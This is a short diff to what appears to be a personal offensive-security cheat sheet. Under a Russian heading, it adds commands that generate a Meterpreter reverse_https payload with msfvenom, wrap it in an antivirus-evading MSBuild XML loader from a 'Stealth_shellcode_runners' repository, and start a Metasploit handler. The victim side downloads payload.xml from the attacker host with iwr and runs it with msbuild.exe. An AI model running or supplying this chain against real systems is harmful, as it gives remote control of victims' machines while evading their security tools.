@@ -37,3 +37,15 @@ create lnk
 
     python micr0_shell.py -i 192.168.0.104 -p 9001 -l csharp
     tr -d '\r\n' < temp479  > output.txt
+
+# Запуск шелла метерпретер через msbuild
+    pipenv shell
+    msvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.104 LPORT=443 -f raw -o meter.bin
+    git clone https://github.com/kymb0/Stealth_shellcode_runners
+	  https://github.com/kymb0/Stealth_shellcode_runners.git
+	 
+    python3 /home/max/avbypass/Stealth_shellcode_runners/msbuild_xml/generator.py meter.bin
+    msfconsole -q -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_https;set EXITFUNC thread;set LHOST 192.168.0.104;set LPORT 443;run;"
+    
+    iwr -Uri http://192.168.0.104:8001/payload.xml -OutFile payload.xml
+    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe payload.xml
